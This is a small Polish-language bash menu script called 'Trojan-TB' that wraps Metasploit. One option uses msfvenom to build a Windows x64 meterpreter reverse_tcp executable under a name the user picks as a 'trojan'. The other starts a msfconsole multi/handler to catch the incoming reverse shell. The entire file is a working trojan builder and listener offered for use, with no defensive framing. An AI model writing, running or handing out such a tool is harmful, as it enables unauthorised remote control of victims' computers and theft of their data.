sluchaj() {

echo "\e[35m Podaj swoje ip w ktorym podawales do budowania\e[0m"
read ip
echo "\e[35m Podaj port w ktorym podawales do budowania\e[0m"
read port
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 
$ip; set lport $port; exploit"


}
Buduj()
{
	echo  "\e[35m Podaj swoje ip \e[0m"
	read ip
	echo  "\e[35m Podaj Port \e[0m"
	read port
	echo  "\e[35m Podaj nazwe Trojana\e[0m"
	read nazwa
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o $nazwa.exe
	echo "\e[35m Zbudowano!\e[0m"
	./start.sh
}




figlet -f pagga Trojan-TB

echo "\e[31m [-------------T-R-O-J-A-N-TB----V.1-0---------------]\e[0m"
echo  "\e[31m [0] - Wyczysc Ekran - ENTER \e[0m"
echo  "\e[31m [1] - Budowanie Trojana"
echo  "\e[31m [2] - Nasluchiwanie"
echo  "\e[31m [------------------------------------------------] \e[0m"

read opcja
case "$opcja" in
	
    "1") Buduj ;;
    "2") sluchaj ;;

*) clear && ./start.sh

esac 
